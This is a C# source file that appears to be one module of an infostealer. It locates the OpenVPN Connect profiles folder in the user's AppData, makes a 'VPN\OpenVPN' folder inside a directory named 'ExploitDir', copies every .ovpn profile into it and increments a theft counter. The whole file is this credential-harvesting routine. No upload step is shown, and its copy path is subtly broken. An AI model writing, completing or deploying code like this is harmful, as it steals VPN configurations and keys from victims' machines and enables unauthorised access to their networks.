using System;
using System.IO;

namespace exos;

internal class OpenVPN
{
	public static void Save()
	{
		string exploitDir = Helper.ExploitDir;
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect\\profiles");
		if (!Directory.Exists(path))
		{
			return;
		}
		try
		{
			Directory.CreateDirectory(exploitDir + "\\VPN\\OpenVPN");
			string[] files = Directory.GetFiles(path);
			foreach (string text in files)
			{
				if (Path.GetExtension(text).Contains("ovpn"))
				{
					File.Copy(text, Path.Combine(exploitDir, "\\VPN\\OpenVPN" + Path.GetFileName(text)));
				}
			}
			Counting.OpenVPN++;
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
